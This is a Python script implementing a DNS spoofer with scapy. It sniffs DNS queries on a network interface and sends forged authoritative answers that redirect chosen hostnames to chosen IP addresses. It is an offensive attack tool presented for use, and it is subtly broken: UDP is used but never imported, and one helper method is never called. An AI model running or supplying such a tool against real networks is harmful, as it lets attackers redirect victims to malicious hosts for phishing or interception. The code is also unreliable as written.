import netifaces
from scapy.all import sniff, IP, DNS, DNSRR, send


class DNSSpoofer:
    def __init__(self, interface, spoofing_rules):
        self.interface = interface
        self.spoofing_rules = spoofing_rules

    def _get_mac_address(self):
        mac_address = netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0][
            "addr"
        ]
        return mac_address

    def _dns_responder(self, packet):
        # Only process DNS requests
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            queried_host = packet[DNS].qd.qname.decode("utf-8")
            if queried_host in self.spoofing_rules.keys():
                spoofed_packet = (
                    IP(dst=packet[IP].src, src=packet[IP].dst)
                    / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                    / DNS(
                        id=packet[DNS].id,
                        qr=1,
                        aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(
                            rrname=packet[DNS].qd.qname,
                            rdata=self.spoofing_rules[queried_host],
                        ),
                    )
                )
                send(spoofed_packet)
                print(
                    f"Spoofed DNS Response Sent: {queried_host} ->"
                    f" {self.spoofing_rules[queried_host]}"
                )

    def start(self):
        print("Starting DNS Spoofer...")
        sniff(iface=self.interface, filter="udp port 53", prn=self._dns_responder)


if __name__ == "__main__":
    interface = "eth0"  # your network interface

    # Specify the host you want to spoof DNS responses for and the IP to redirect to
    spoofing_rules = {
        "www.example.com.": "192.0.2.0",
        "www.test.com.": "203.0.113.0",
    }

    dns_spoofer = DNSSpoofer(interface, spoofing_rules)
    dns_spoofer.start()
